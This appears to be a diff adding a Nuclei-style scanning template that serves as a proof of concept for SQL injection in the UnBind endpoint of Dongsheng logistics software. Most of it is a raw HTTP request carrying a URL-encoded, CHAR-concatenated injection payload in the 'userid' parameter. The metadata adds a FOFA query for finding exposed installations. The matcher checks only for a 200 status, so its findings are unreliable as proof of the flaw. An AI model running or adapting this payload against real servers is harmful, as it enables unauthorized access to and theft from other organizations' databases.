@@ -1,0 +1,33 @@
+id: poc-lpv66bvkewycnn49
+info:
+  name: 东胜物流软件 UnBind 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lpv66bvkewycnn49'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lpv66bvkewycnn49
+    fofa: app="东胜物流软件-物流软件"
+http:
+- raw:
+  - 'GET /Mobile/Login/UnBind?userid=-2963%27+OR+1636+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%281636%3D1636%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29--+oTEn HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: en-US;q=0.9,en;q=0.8
+
+    Cache-Control: max-age=0
+
+    Connection: keep-alive
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
